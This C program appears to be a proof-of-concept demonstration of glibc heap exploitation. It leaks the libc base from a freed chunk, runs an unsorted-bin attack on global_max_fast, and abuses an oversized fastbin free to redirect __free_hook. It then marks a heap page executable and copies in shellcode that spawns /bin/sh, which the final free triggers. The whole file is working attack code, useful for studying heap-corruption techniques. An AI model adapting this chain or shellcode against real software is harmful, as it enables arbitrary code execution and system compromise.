#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

// fastbin size convert to address
#define offset2size(x)	((x)<<1)
#define ul unsigned long

unsigned char shellcode[]="\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int main(){

	ul libc_base = 0;
	ul global_max_fast = 0;
	ul __free_hook = 0x3c67a8;
	ul main_arena = 0x3c4b20;
	ul *p, *p1, *p2, *p3, *p4;

	setbufs();

	p1 = malloc(0x100);
	p2 = malloc(0x20);

	free(p1);
	libc_base = *(ul*)p1;
	libc_base -= 0x3c4b78;
	global_max_fast = libc_base + 0x3c67f8;
	free(p2);
	printf("libc_base is :%lx\n", libc_base);
	printf("&(global_max_fast) is :%lx\n", global_max_fast);
	printf("global_max_fast is :%lx\n", *(ul*)global_max_fast);

	p1 = malloc(0x100);
	p2 = malloc(0x20);
	p3 = malloc(offset2size(__free_hook-main_arena));
	malloc(0x20);

	free(p1);
	p = (ul*)p1;
	//*(p+1) = (ul)&libc_base - sizeof(ul*)*2;
	//malloc(0x100);
	//printf("after unsorted-bin attack is :%lx\n", libc_base);
	
	*(p+1) = global_max_fast - sizeof(ul*)*2;
	malloc(0x100);
	printf("after unsorted-bin attack\n");
	printf("global_max_fast is :%lx\n", *(ul*)global_max_fast);

	free(p3);
	ul page = ((ul)p3-sizeof(ul*)*2)&(~0xFFF);
	mprotect((void*)page, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
	memcpy((void*)((ul)p3-sizeof(ul*)*2), shellcode, sizeof(shellcode));

	// do not malloc
	free(p2);


	return 0;
}

